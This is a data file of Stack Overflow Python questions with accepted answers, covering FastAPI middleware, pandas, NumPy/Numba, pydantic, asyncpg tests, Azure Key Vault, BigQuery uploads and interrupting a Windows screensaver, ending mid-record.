    "AcceptedAnswer": "The response body is an iterator, which once it has been iterated through, it cannot be re-iterated again. Thus, you either have to save all the iterated data to a list (or bytes variable) and use that to return a custom Response, or initiate the iterator again. The options below demonstrate both approaches. In case you would like to get the request body inside the middleware as well, please have a look at this answer.\nOption 1\nSave the data to a list and use iterate_in_threadpool to initiate the iterator again, as described here - which is what StreamingResponse uses, as shown here.\nfrom starlette.concurrency import iterate_in_threadpool\n\n@app.middleware(\"http\")\nasync def some_middleware(request: Request, call_next):\n    response = await call_next(request)\n    response_body = [chunk async for chunk in response.body_iterator]\n    response.body_iterator = iterate_in_threadpool(iter(response_body))\n    print(f\"response_body={response_body[0].decode()}\")\n    return response\n\nNote 1: If your code uses StreamingResponse, response_body[0] would return only the first chunk of the response. To get the entire response body, you should join that list of bytes (chunks), as shown below (.decode() returns a string representation of the bytes object):\nprint(f\"response_body={(b''.join(response_body)).decode()}\")\n\nNote 2: If you have a StreamingResponse streaming a body that wouldn't fit into your server's RAM (for example, a response of 30GB), you may run into memory errors when iterating over the response.body_iterator (this applies to both options listed in this answer), unless you loop through response.body_iterator (as shown in Option 2), but instead of storing the chunks in an in-memory variable, you store it somewhere on the disk. However, you would then need to retrieve the entire response data from that disk location and load it into RAM, in order to send it back to the client (which could extend the delay in responding to the client even more)\u2014in that case, you could load the contents into RAM in chunks and use StreamingResponse, similar to what has been demonstrated here, here, as well as here, here and here (in Option 1, you can just pass your iterator/generator function to iterate_in_threadpool). However, I would not suggest following that approach, but instead have such endpoints returning large streaming responses excluded from the middleware, as described in this answer.\nOption 2\nThe below demosntrates another approach, where the response body is stored in a bytes object (instead of a list, as shown above), and is used to return a custom Response directly (along with the status_code, headers and media_type of the original response).\n@app.middleware(\"http\")\nasync def some_middleware(request: Request, call_next):\n    response = await call_next(request)\n    response_body = b\"\"\n    async for chunk in response.body_iterator:\n        response_body += chunk\n    print(f\"response_body={response_body.decode()}\")\n    return Response(content=response_body, status_code=response.status_code, \n        headers=dict(response.headers), media_type=response.media_type)\n\n"
}
{
    "Id": 73072257,
    "PostTypeId": 1,
    "Title": "Resolve warning \"A NumPy version >=1.16.5 and <1.23.0 is required for this version of SciPy\"?",
    "Body": "When I import SciPy or a library dependent on it, I receive the following warning message:\nUserWarning: A NumPy version >=1.16.5 and <1.23.0 is required for this version of SciPy (detected version 1.23.1\n\nIt's true that I am running NumPy version 1.23.1, however this message is a mystery to me since I am running SciPy version 1.7.3, which, according to SciPy's documentation, is compatible with NumPy \nAnyone having this problem or know how to resolve it?\nI am using Conda as an environment manager, and all my packages are up to date as far as I know.\n\npython: 3.9.12\nnumpy: 1.23.1\nscipy: 1.7.3\n\nThanks in advance if anyone has any clues !\n",
    "AcceptedAnswerId": 73072455,
    "AcceptedAnswer": "According to the setup.py file of the scipy 1.7.3, numpy is indeed . As @Libra said, the docs must be incorrect. You can:\n\nIgnore this warning\nUse scipy 1.8\nUse numpy \n\nEdit:\nThis is now fixed in the dev docs of scipy https://scipy.github.io/devdocs/dev/toolchain.html\n"
}
{
    "Id": 72258087,
    "PostTypeId": 1,
    "Title": "unexpected keyword argument 'tenant_id' while accessing Azure Key Vault in Python",
    "Body": "I was trying to accessing my key vault, but I got always the same error:\nAppServiceCredential.get_token failed: request() got an unexpected keyword argument 'tenant_id'\nManagedIdentityCredential.get_token failed: request() got an unexpected keyword argument 'tenant_id'\n\nThis was the code I used in an Azure Machine Learning notebook, copied from the docs:\nfrom azure.identity import ManagedIdentityCredential\nfrom azure.keyvault.secrets import SecretClient\n\ncredential = ManagedIdentityCredential()\nsecret_client = SecretClient(vault_url=\"https://XXXX.vault.azure.net/\", credential=credential)\n\nsecretName = 'test'\nretrieved_secret = secret_client.get_secret(secretName) # here's the error\nretrieved_secret\n\nWhat is wrong? Could you help me?\nThank you in advance.\n",
    "AcceptedAnswerId": 72262694,
    "AcceptedAnswer": "This error is because of a bug that has since been fixed in azure-identity's ManagedIdentityCredential. Key Vault clients in recent packages include a tenant ID in token requests to support cross-tenant authentication, but some azure-identity credentials didn't correctly handle this keyword argument until the bug was fixed in version 1.8.0. Installing azure-identity>=1.8.0 should fix the error you're getting.\n(Disclaimer: I work for the Azure SDK for Python)\n"
}
{
    "Id": 71925980,
    "PostTypeId": 1,
    "Title": "cannot perform operation: another operation is in progress in pytest",
    "Body": "I want to test some function, that work with asyncpg. If I run one test at a time, it works fine. But if I run several tests at a time, all tests except the first one crash with the error asyncpg.exceptions._base.InterfaceError: cannot perform operation: another operation is in progress.\nTests:\n@pytest.mark.asyncio\nasync def test_project_connection(superuser_id, project_id):\n    data = element_data_random(project_id)\n\n    element_id = (await resolve_element_create(data=data, user_id=superuser_id))[\"id\"]\n    project_elements = (await db_projects_element_ids_get([project_id]))[project_id]\n\n    assert element_id in project_elements\n\n\n@pytest.mark.asyncio\nasync def test_project_does_not_exist(superuser_id):\n    data = element_data_random(str(uuid.uuid4()))\n\n    with pytest.raises(ObjectWithIdDoesNotExistError):\n        await resolve_element_create(data=data, user_id=superuser_id)\n\nAll functions for work with db use pool look like:\nasync def (*args):\n    pool = await get_pool()\n\n    await pool.execute(...) # or fetch/fetchrow/fetchval\n\nHow I get the pool:\ndb_pool = None\n\n\nasync def get_pool():\n    global db_pool\n\n    async def init(con):\n        await con.set_type_codec('jsonb', encoder=ujson.dumps, decoder=ujson.loads, schema='pg_catalog')\n        await con.set_type_codec('json', encoder=ujson.dumps, decoder=ujson.loads, schema='pg_catalog')\n\n    if not db_pool:\n        dockerfiles_dir = os.path.join(src_dir, 'dockerfiles')\n        env_path = os.path.join(dockerfiles_dir, 'dev.env')\n\n        try:\n            # When code and DB inside docker containers\n            host = 'postgres-docker'\n            socket.gethostbyname(host)\n        except socket.error:\n            # When code on localhost, but DB inside docker container\n            host = 'localhost'\n\n        load_dotenv(dotenv_path=env_path)\n\n        db_pool = await asyncpg.create_pool(\n            database=os.getenv(\"POSTGRES_DBNAME\"),\n            user=os.getenv(\"POSTGRES_USER\"),\n            password=os.getenv(\"POSTGRES_PASSWORD\"),\n            host=host,\n            init=init\n        )  \n\n    return db_pool\n\nAs far as I understand under the hood, asyn\u0441pg creates a new connection and runs the request inside that connection if you run the request through pool. Which makes it clear that each request should have its own connection. However, this error occurs, which is caused when one connection tries to handle two requests at the same time\n",
    "AcceptedAnswerId": 71966226,
    "AcceptedAnswer": "Okay, thanks to @Adelin I realized that I need to run each asynchronous test synchronously. I I'm new to asyncio so I didn't understand it right away and found a solution.\nIt was:\n@pytest.mark.asyncio\nasync def test_...(*args):\n    result = await \n\n    assert result == excepted_result\n\nIt become:\ndef test_...(*args):\n    async def inner()\n        result = await \n\n        assert result == excepted_result\n\n    asyncio.get_event_loop().run_until_complete(inner())\n\n"
}
{
    "Id": 73136808,
    "PostTypeId": 1,
    "Title": "AWS Glue error - Invalid input provided while running python shell program",
    "Body": "I have Glue job, a python shell code. When I try to run it I end up getting the below error.\nJob Name : xxxxx Job Run Id : yyyyyy failed to execute with exception Internal service error : Invalid input provided\nIt is not specific to code, even if I just put\nimport boto3\nprint('loaded')\n\nI am getting the error right after clicking the run job option. What is the issue here?\n",
    "AcceptedAnswerId": 73162640,
    "AcceptedAnswer": "I think Quatermass is right, the jobs started working out of the blue the next day without any changes.\n"
}
{
    "Id": 73242764,
    "PostTypeId": 1,
    "Title": "How to efficiently calculate membership counts by month and group",
    "Body": "I have to calculate in Python the number of unique active members by year, month, and group for a large dataset (N ~ 30M).  Membership always starts at the beginning of the month and ends at the end of the month. Here is a very small subset of the data.\nprint(df.head(6))\n   member_id  type  start_date    end_date\n1         10     A  2021-12-01  2022-05-31\n2         22     B  2022-01-01  2022-07-31\n3         17     A  2022-01-01  2022-06-30\n4         57     A  2022-02-02  2022-02-28\n5         41     B  2022-02-02  2022-04-30\n\nMy current solution is inefficient as it relies on a for loop:\nimport pandas as pd\n\n\ndate_list = pd.date_range(\n    start=min(df.start_date),\n    end=max(df.end_date),\n    freq='MS'\n)\nmembers = pd.DataFrame()\n\nfor d in date_list:\n    df['date_filter'] = (\n        (d >= df.start_date)\n        & (d <= df.end_date)\n    )\n    grouped_members = (\n         df\n         .loc[df.date_filter]\n         .groupby(by='type', as_index=False)\n         .member_id\n         .nunique()\n    )\n    member_counts = pd.DataFrame(\n         data={'year': d.year, 'month': d.month}\n         index=[0]\n    )\n     member_counts = member_counts.merge(\n         right=grouped_members,\n         how='cross'\n    )\n    members = pd.concat[members, member_counts]\nmembers = members.reset_index(drop=True)\n\nIt produces the following:\nprint(members)\n\n    year  month  type  member_id\n 0  2021     12     A          1\n 1  2021     12     B          0\n 2  2022      1     A          3\n 3  2022      1     B          1\n 4  2022      2     A          3\n 5  2022      2     B          2\n 6  2022      3     A          2\n 7  2022      3     B          2\n 8  2022      4     A          2\n 9  2022      4     B          2\n10  2022      5     A          2\n11  2022      5     B          1\n12  2022      6     A          1\n13  2022      6     B          1\n14  2022      7     A          0\n15  2022      7     B          1\n\nI'm looking for a completely vectorized solution to reduce computational time.\n",
    "AcceptedAnswerId": 73243551,
    "AcceptedAnswer": "Updated answer that avoids melt. Maybe faster? Uses the same idea as before where we don't actually care about member ids, we are just keeping track of start/end counts\n#Create multiindexed series for reindexing later\nmonths = pd.date_range(\n    start=df.start_date.min(),\n    end=df.end_date.max(),\n    freq='MS',\n).to_period('M')\n\nind = pd.MultiIndex.from_product([df.type.unique(),months],names=['type','month'])\n\n#push each end date to the next month\ndf['end_date'] += pd.DateOffset(1) \n\n#Convert the dates to yyyy-mm\ndf['start_date'] = df.start_date.dt.to_period('M')\ndf['end_date'] = df.end_date.dt.to_period('M')\n\n#Get cumsum counts per type/month of start and ends \ngb_counts = (\n    df.groupby('type').agg(\n        start = ('start_date','value_counts'),\n        end = ('end_date','value_counts'),\n    )\n    .reindex(ind)\n    .fillna(0)\n    .groupby('type')\n    .cumsum()\n    .astype(int)\n)\n\ncounts = (gb_counts.start-gb_counts.end).unstack()\ncounts\n\nORIGINAL\nUpdated answer than works unless the same member_id/group has overlapping date ranges (in which case it double-counts)\nThe idea is to keep track of when the number of users changes per group instead of exploding out all months per user.\nI think this should be very fast and I'm curious how it performs\nOutput\n\nCode (looks long but is mostly comments)\nimport pandas as pd\nimport itertools\n\n#Load example data\nimport io #just for reading in your example table\ndf = pd.read_csv(\n    io.StringIO(\"\"\"\n0  member_id  type  start_date    end_date\n1         10     A  2021-12-01  2022-05-31\n2         22     B  2022-01-01  2022-07-31\n3         17     A  2022-01-01  2022-06-30\n4         57     A  2022-02-02  2022-02-28\n5         41     B  2022-02-02  2022-04-30\n\"\"\"),\n    delim_whitespace=True,\n    index_col=0,\n    parse_dates=['start_date','end_date'],\n).reset_index(drop=True)\n\n#Create categorical index for reindexing and ffill\nmonths = pd.date_range(\n    start=df.start_date.min(),\n    end=df.end_date.max(),\n    freq='MS',\n).to_period('M')\n\ncat_ind = pd.Categorical(itertools.product(df.type.unique(),months))\n\n#push each end date to the next month\ndf['end_date'] += pd.DateOffset(1) \n\n#Convert the dates to yyyy-mm\ndf['start_date'] = df.start_date.dt.to_period('M')\ndf['end_date'] = df.end_date.dt.to_period('M')\n\n#Melt from:\n#\n#member_id | type | start_date |  end_date\n#----------|------|------------|-----------\n#       10 |   A  | 2021-12-01 | 2022-05-31\n# ...\n#\n#to\n#\n# type | active_users | date\n#----------------------------\n#    A |   start_date | 2021-12-01\n#    A |     end_date | 2022-05-31\n# ...\ndf = df.melt(\n    id_vars='type',\n    value_vars=['start_date','end_date'],\n    var_name='active_users',\n    value_name='date',\n).sort_values('date')\n\n#Replace var column with +1/-1 for start/end date rows\n#\n# type | active_users | date\n#----------------------------\n#    A |            1 | 2021-12-01\n#    A |           -1 | 2022-05-31\n# ...\ndf['active_users'] = df.active_users.replace({'start_date':1,'end_date':-1})\n\n#Sum within each type/date then cumsum the number of active users\ndf = df.groupby(['type','date']).sum().cumsum()\n\n#Reindex to ffill missing dates\ndf = df.reindex(cat_ind).ffill().astype(int)\n\ndf.unstack()\n\n"
}
{
    "Id": 72476094,
    "PostTypeId": 1,
    "Title": "pydantic.error_wrappers.ValidationError: 11 validation errors for For Trip type=value_error.missing",
    "Body": "Im getting this error with my pydantic schema, but oddly it is generating the object correctly, and sending it to the SQLAlchemy models, then it suddenly throws error for all elements in the model.\nresponse -> id\n  field required (type=value_error.missing)\nresponse -> date\n  field required (type=value_error.missing)\nresponse -> time\n  field required (type=value_error.missing)\nresponse -> price\n  field required (type=value_error.missing)\nresponse -> distance\n  field required (type=value_error.missing)\nresponse -> origin_id\n  field required (type=value_error.missing)\nresponse -> destination_id\n  field required (type=value_error.missing)\nresponse -> driver_id\n  field required (type=value_error.missing)\nresponse -> passenger_id\n  field required (type=value_error.missing)\nresponse -> vehicle_id\n  field required (type=value_error.missing)\nresponse -> status\n  field required (type=value_error.missing)\n\ni must say that all the fields should have values. And the error trace do not references any part of my code so i dont even know where to debug. Im a noob in SQLAlchemy/pydantic\nhere are some parts of the code\nclass Trip(BaseModel):\n    id: int\n    date: str\n    time: str\n    price: float\n    distance: float\n    origin_id: int\n    destination_id: int\n    driver_id: int\n    passenger_id: int\n    vehicle_id: int\n    status: Status\n\n    class Config:\n        orm_mode = True\n\nclass TripDB(Base):\n    __tablename__ = 'trip'\n    __table_args__ = {'extend_existing': True}\n    id = Column(Integer, primary_key=True, index=True)\n    date = Column(DateTime, nullable=False)\n    time = Column(String(64), nullable=False)\n    price = Column(Float, nullable=False)\n    distance = Column(Float, nullable=False)\n    status = Column(String(64), nullable=False)\n\n    origin_id = Column(\n        Integer, ForeignKey('places.id'), nullable=False)\n    destination_id = Column(\n        Integer, ForeignKey('places.id'), nullable=False)\n\n    origin = relationship(\"PlaceDB\", foreign_keys=[origin_id])\n    destination = relationship(\"PlaceDB\", foreign_keys=[destination_id])\n\n    driver_id = Column(\n        Integer, ForeignKey('driver.id'), nullable=False)\n    vehicle_id = Column(\n        Integer, ForeignKey('vehicle.id'), nullable=False)\n    passenger_id = Column(\n        Integer, ForeignKey('passenger.id'), nullable=False)\n\ndef create_trip(trip: Trip, db: Session):\n    origin = db.query(models.PlaceDB).filter(models.PlaceDB.id == trip.origin_id).first()\n    destination = db.query(models.PlaceDB).filter(models.PlaceDB.id == trip.destination_id).first()\n    db_trip = TripDB(\n        id=(trip.id or None),\n        date=trip.date or None, time=trip.time or None, price=trip.price or None, \n\n    distance=trip.distance or None, \n            origin_id=trip.origin_id or None, destination_id=(trip.destination_id or None), status=trip.status or None, \n            driver_id=trip.driver_id or None, passenger_id=trip.passenger_id or None, vehicle_id=trip.vehicle_id or None, origin=origin, destination=destination)\n    try:\n        db.add(db_trip)\n        db.commit()\n        db.refresh(db_trip)\n        return db_trip\n\n    except:\n        return \"Somethig went wrong\"\n\n\n",
    "AcceptedAnswerId": 72564863,
    "AcceptedAnswer": "It seems like a bug on the pydantic model, it happened to me as well, and i was not able to fix it, but indeed if you just skip the type check in the route it works fine\n"
}
{
    "Id": 71984449,
    "PostTypeId": 1,
    "Title": "How to add an extra middle step into a list comprehension?",
    "Body": "Let's say I have a list[str] object containing timestamps in \"HH:mm\" format, e.g.\ntimestamps = [\"22:58\", \"03:11\", \"12:21\"]\n\nI want to convert it to a list[int] object with the \"number of minutes since midnight\" values for each timestamp:\nconverted = [22*60+58, 3*60+11, 12*60+21]\n\n... but I want to do it in style and use a single list comprehension to do it. A (syntactically incorrect) implementation that I naively constructed was something like:\ndef timestamps_to_minutes(timestamps: list[str]) -> list[int]:\n    return [int(hh) * 60 + int(mm) for ts in timestamps for hh, mm = ts.split(\":\")]\n\n... but this doesn't work because for hh, mm = ts.split(\":\") is not a valid syntax.\nWhat would be the valid way of writing the same thing?\nTo clarify: I can see a formally satisfying solution in the form of:\ndef timestamps_to_minutes(timestamps: list[str]) -> list[int]:\n    return [int(ts.split(\":\")[0]) * 60 + int(ts.split(\":\")[1]) for ts in timestamps]\n\n... but this is highly inefficient and I don't want to split the string twice.\n",
    "AcceptedAnswerId": 71984511,
    "AcceptedAnswer": "You could use an inner generator expression to do the splitting:\n[int(hh)*60 + int(mm) for hh, mm in (ts.split(':') for ts in timestamps)]\n\n\nAlthough personally, I'd rather use a helper function instead:\ndef timestamp_to_minutes(timestamp: str) -> int:\n    hh, mm = timestamp.split(\":\")\n    return int(hh)*60 + int(mm)\n\n[timestamp_to_minutes(ts) for ts in timestamps]\n\n# Alternative\nlist(map(timestamp_to_minutes, timestamps))\n\n"
}
{
    "Id": 71563696,
    "PostTypeId": 1,
    "Title": "Pandas to_gbq() TypeError \"Expected bytes, got a 'int' object",
    "Body": "I am using the pandas_gbq module to try and append a dataframe to a table in Google BigQuery.\nI keep getting this error:\n\nArrowTypeError: Expected bytes, got a 'int' object.\n\nI can confirm the data types of the dataframe match the schema of the BQ table.\nI found this post regarding Parquet files not being able to have mixed datatypes: Pandas to parquet file\nIn the error message I'm receiving, I see there is a reference to a Parquet file, so I'm assuming the df.to_gbq() call is creating a Parquet file and I have a mixed data type column, which is causing the error. The error message doesn't specify.\nI think that my challenge is that I can't see to find which column has the mixed datatype - I've tried casting them all as strings and then specifying the table schema parameter, but that hasn't worked either.\nThis is the full error traceback:\nIn [76]: df.to_gbq('Pricecrawler.Daily_Crawl_Data', project_id=project_id, if_exists='append')\nArrowTypeError                            Traceback (most recent call last)\n in \n----> 1 df.to_gbq('Pricecrawler.Daily_Crawl_Data', project_id=project_id, if_exists='append')\n\n~\\Anaconda3\\lib\\site-packages\\pandas\\core\\frame.py in to_gbq(self, destination_table, \nproject_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, \nprogress_bar, credentials)\n   1708         from pandas.io import gbq\n   1709\n-> 1710         gbq.to_gbq(\n   1711             self,\n   1712             destination_table,\n\n~\\Anaconda3\\lib\\site-packages\\pandas\\io\\gbq.py in to_gbq(dataframe, destination_table, project_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, progress_bar, credentials)\n    209 ) -> None:\n    210     pandas_gbq = _try_import()\n--> 211     pandas_gbq.to_gbq(\n    212         dataframe,\n    213         destination_table,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\gbq.py in to_gbq(dataframe, destination_table, project_id, chunksize, reauth, if_exists, auth_local_webserver, table_schema, location, progress_bar, credentials, api_method, verbose, private_key)\n   1191         return\n   1192\n-> 1193     connector.load_data(\n   1194         dataframe,\n   1195         destination_table_ref,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\gbq.py in load_data(self, dataframe, destination_table_ref, chunksize, schema, progress_bar, api_method, billing_project)\n    584\n    585         try:\n--> 586             chunks = load.load_chunks(\n    587                 self.client,\n    588                 dataframe,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\load.py in load_chunks(client, dataframe, destination_table_ref, chunksize, schema, location, api_method, billing_project)\n    235 ):\n    236     if api_method == \"load_parquet\":\n--> 237         load_parquet(\n    238             client,\n    239             dataframe,\n\n~\\Anaconda3\\lib\\site-packages\\pandas_gbq\\load.py in load_parquet(client, dataframe, destination_table_ref, location, schema, billing_project)\n    127\n    128     try:\n--> 129         client.load_table_from_dataframe(\n    130             dataframe,\n    131             destination_table_ref,\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\client.py in load_table_from_dataframe(self, dataframe, destination, num_retries, job_id, job_id_prefix, location, project, job_config, parquet_compression, timeout)\n   2669                         parquet_compression = parquet_compression.upper()\n   2670\n-> 2671                     _pandas_helpers.dataframe_to_parquet(\n   2672                         dataframe,\n   2673                         job_config.schema,\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\_pandas_helpers.py in dataframe_to_parquet(dataframe, bq_schema, filepath, parquet_compression, parquet_use_compliant_nested_type)\n    584\n    585     bq_schema = schema._to_schema_fields(bq_schema)\n--> 586     arrow_table = dataframe_to_arrow(dataframe, bq_schema)\n    587     pyarrow.parquet.write_table(\n    588         arrow_table, filepath, compression=parquet_compression, **kwargs,\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\_pandas_helpers.py in dataframe_to_arrow(dataframe, bq_schema)\n    527         arrow_names.append(bq_field.name)\n    528         arrow_arrays.append(\n--> 529             bq_to_arrow_array(get_column_or_index(dataframe, bq_field.name), bq_field)\n    530         )\n    531         arrow_fields.append(bq_to_arrow_field(bq_field, arrow_arrays[-1].type))\n\n~\\Anaconda3\\lib\\site-packages\\google\\cloud\\bigquery\\_pandas_helpers.py in bq_to_arrow_array(series, bq_field)\n    288     if field_type_upper in schema._STRUCT_TYPES:\n    289         return pyarrow.StructArray.from_pandas(series, type=arrow_type)\n--> 290     return pyarrow.Array.from_pandas(series, type=arrow_type)\n    291\n    292\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\array.pxi in pyarrow.lib.Array.from_pandas()\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\array.pxi in pyarrow.lib.array()\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\array.pxi in pyarrow.lib._ndarray_to_array()\n\n~\\Anaconda3\\lib\\site-packages\\pyarrow\\error.pxi in pyarrow.lib.check_status()\n\nArrowTypeError: Expected bytes, got a 'int' object\n\n",
    "AcceptedAnswerId": 73284286,
    "AcceptedAnswer": "Had this same issue - solved it simply with\ndf = df.astype(str)\n\nand doing to_gbq on that instead.\nCaveat is that all your fields will now be strings...\n"
}
{
    "Id": 72269651,
    "PostTypeId": 1,
    "Title": "Numpy way of splitting array when cumaltive sum > x",
    "Body": "Data\nLets take the following 2d array:\nstarts = [0, 4, 10, 13, 23, 27]\nends = [4, 10, 13, 23, 27, 32]\nlengths = [4, 6, 3, 10, 4, 5] \n\narr = np.array([starts, ends, lengths]).T\n\nThus looking like:\n[[ 0  4  4]\n [ 4 10  6]\n [10 13  3]\n [13 23 10]\n [23 27  4]\n [27 32  5]]\n\n\nGoal\nNow I want to \"loop\" through the lengths and as soon as soon as the cumaltive sum reaches 10 I want to output the starts and ends and then restart the cumulative counting.\n\nWorking code\ntot_size = 0\nstart = 0\n\nfor i, numb in enumerate(arr[:,-1]):\n    # update sum\n    tot_size += numb\n\n    # Check if target size is reached\n    if tot_size >= 10:\n        start_loc, end_loc = arr[:,0][start],  arr[:,1][i]\n        print('Start: {}\\nEnd: {}\\nSum: {}\\n'.format(start_loc, end_loc, tot_size))\n        start = i + 1\n        tot_size = 0\n\n# Last part\nstart_loc, end_loc = arr[:,0][start],  arr[:,1][i]\nprint('Start: {}\\nEnd: {}\\nSum: {}\\n'.format(start_loc, end_loc, tot_size))\n\nWhich will print:\n\nStart: 0 End: 10 Sum: 10\nStart: 10 End: 23 Sum: 13\nStart: 23 End: 32 Sum: 9\n\n(I don't need to know the resulting sum but I do need to know the starts and ends)\n\nNumpy try\nI suppose there must be a much more straightforward, or a vectorized, way of doing this with numpy.\n\ncumsum + remainder\n\nI was thinking of something like np.remainder(np.cumsum(arr[:,-1]), 10) however it will be \"hard\" to say when something is close to the target number (10 here), which is different from just splitting when sum > x\n\nstride_tricks\n\nSince the above doesn't work in a window I thought of stides but these windows are of fixed sizes\nAll ideas are welcome :)\n",
    "AcceptedAnswerId": 72279421,
    "AcceptedAnswer": "Numpy is not designed for solving efficiently such a problem. You can still solve this using some tricks or the usual combination of cumsum + division + diff + where or similar ones (like @Kevin proposed), but AFAIK they are all inefficient. Indeed, they require many temporary arrays and expensive operations.\nTemporary arrays are expensive for two reasons: for small arrays, the overhead of Numpy function is typically of several microseconds per call resulting in generally in dozens of microseconds for the whole operation; and for big arrays, each operation will be memory bound and memory bandwidth is small on modern platforms. Actually, it is even worst since writing in newly allocated array is much slower due to page faults and Numpy array writes are currently not optimized on most platforms (including the mainstream x86-64 one).\nAs for \"expensive operations\" this includes sorting which runs in O(n log n) (quick-sort is used by default) and is generally memory bound, finding the unique values (which currently does a sort internally) and integer division which is known to be very slow since ever.\n\nOne solution to solve this problem is to use Numba (or Cython). Numba use a just-in-time compiler so to write fast optimized function. It is especially useful to write your own efficient basic Numpy built-ins. Here is an example based on your code:\nimport numba as nb\nimport numpy as np\n\n@nb.njit(['(int32[:,:],)', '(int64[:,:],)'])\ndef compute(arr):\n    n = len(arr)\n    tot_size, start, cur = 0, 0, 0\n    slices = np.empty((n, 2), arr.dtype)\n\n    for i in range(n):\n        tot_size += arr[i, 2]\n\n        if tot_size >= 10:\n            slices[cur, 0] = arr[start, 0]\n            slices[cur, 1] = arr[i, 1]\n            start = i + 1\n            cur += 1\n            tot_size = 0\n\n    slices[cur, 0] = arr[start, 0]\n    slices[cur, 1] = arr[i, 1]\n    return slices[:cur+1]\n\nFor your small example, the Numba function takes about 0.75 us on my machine while the initial solution takes 3.5 us. In comparison, the Numpy solutions provided by @Kevin (returning the indices) takes 24 us for the np.unique and 6 us for the division-based solution. In fact, the basic np.cumsum already takes 0.65 us on my machine. Thus, the Numba solution is the fastest. It should be especially true for larger arrays.\n"
}
{
    "Id": 72425408,
    "PostTypeId": 1,
    "Title": "Interrupt (NOT prevent from starting) screensaver",
    "Body": "I am trying to programmatically interrupt the screensaver by moving the cursor like this:\nwin32api.SetCursorPos((random.choice(range(100)),random.choice(range(100))))\n\nAnd it fails with the message:\npywintypes.error: (0, 'SetCursorPos', 'No error message is available')\n\nThis error only occurs if the screensaver is actively running.\nThe reason for this request is that the computer is ONLY used for inputting data through a bluetooth device (via a Python program). When the BT device sends data to the computer the screensaver is not interrupted (which means I cannot see the data the BT device sent). Thus, when the Python program receives data from the BT device it is also supposed to interrupt the screensaver.\nI have seen several solution on how to prevent the screensaver from starting (which are not suitable solutions in my case), but none on how to interrupt a running screensaver. How can I do this, using Windows\u00a010 and Python 3.10?\n",
    "AcceptedAnswerId": 73286378,
    "AcceptedAnswer": "The Windows operating system has a hierarchy of objects.  At the top of the hierarchy is the \"Window Station\".  Just below that is the \"Desktop\" (not to be confused with the desktop folder, or even the desktop window showing the icons of that folder).  You can read more about this concept in the documentation.\nI mention this because ordinarily only one Desktop can receive and process user input at any given time.  And, when a screen saver is activated by Windows due to a timeout, Windows creates a new Desktop to run the screen saver.\nThis means any application associated with any other Desktop, including your Python script, will be unable to send input to the new Desktop without some extra work.  The nature of that work depends on a few factors.  Assuming the simplest case, a screen saver that's created without the \"On resume, display logon screen\", and no other Window Station has been created by a remote connection or local user login, then you can ask Windows for the active Desktop, attach the Python script to that Desktop, move the mouse, and revert back to the previous Desktop so the rest of the script works as expected.\nThankfully, the code to do this is easier than the explanation:\nimport win32con, win32api, win32service\nimport random\n# Get a handle to the current active Desktop\nhdesk = win32service.OpenInputDesktop(0, False, win32con.MAXIMUM_ALLOWED);\n# Get a handle to the Desktop this process is associated with\nhdeskOld = win32service.GetThreadDesktop(win32api.GetCurrentThreadId())\n# Set this process to handle messages and input on the active Desktop\nhdesk.SetThreadDesktop()\n# Move the mouse some random amount, most Screen Savers will react to this,\n# close the window, which in turn causes Windows to destroy this Desktop\n# Also, move the mouse a few times to avoid the edge case of moving\n# it randomly to the location it was already at.\nfor _ in range(4):\n    win32api.SetCursorPos((random.randint(0, 100), random.randint(0, 100)))\n# Revert back to the old desktop association so the rest of this script works\nhdeskOld.SetThreadDesktop()\n\nHowever, if the screen saver is running on a separate Window Station because \"On resume, display logon screen\" is selected, or another user is connected either via the physical Console or has connected remotely, then connecting to and attaching to the active Desktop will require elevation of the Python script, and even then, depending on other factors, it may require special permissions.\nAnd while this might help your specific case, I will add the the core issue in the general case is perhaps more properly defined as asking \"how do I notify the user of the state of something, without the screen saver blocking that notification?\".  The answer to that question isn't \"cause the screen saver to end\", but rather \"Use something like SetThreadExecutionState() with ES_DISPLAY_REQUIRED to keep the screen saver from running.  And show a full-screen top-most window that shows the current status, and when you want to alert the user, flash an eye-catching graphic and/or play a sound to get their attention\".\nHere's what that looks like, using tkinter to show the window:\nfrom datetime import datetime, timedelta\nimport ctypes\nimport tkinter as tk\n\n# Constants for calling SetThreadExecutionState\nES_CONTINUOUS = 0x80000000\nES_SYSTEM_REQUIRED = 0x00000001\nES_DISPLAY_REQUIRED= 0x00000002\n\n# Example work, show nothing, but when the timer hits, \"alert\" the user\nALERT_AT = datetime.utcnow() + timedelta(minutes=2)\n\ndef timer(root):\n    # Called every second until we alert the user\n    # TODO: This is just alerting the user after a set time goes by,\n    #       you could perform a custom check here, to see if the user\n    #       should be alerted based off other conditions.\n    if datetime.utcnow() >= ALERT_AT:\n        # Just alert the user\n        root.configure(bg='red')\n    else:\n        # Nothing to do, check again in a bit\n        root.after(1000, timer, root)\n\n# Create a full screen window\nroot = tk.Tk()\n# Simple way to dismiss the window\nroot.bind(\"\", lambda e: e.widget.destroy())\nroot.wm_attributes(\"-fullscreen\", 1)\nroot.wm_attributes(\"-topmost\", 1)\nroot.configure(bg='black')\nroot.config(cursor=\"none\")\nroot.after(1000, timer, root)\n# Disable the screen saver while the main window is shown\nctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED)\nroot.mainloop()\n# All done, let the screen saver run again\nctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS)\n\nWhile more work, doing this will solve issues around the secure desktop with \"On resume, display logon screen\" set, and also prevent the system from going to sleep if it's configured to do so.  It just generally allows the application to more clearly communicate its intention.\n"
}
{
    "Id": 73325131,
    "PostTypeId": 1,
    "Title": "How to set all elements of pytorch tensor to zero after a certain index in the given axis, where the index is given by another pytorch tensor?",
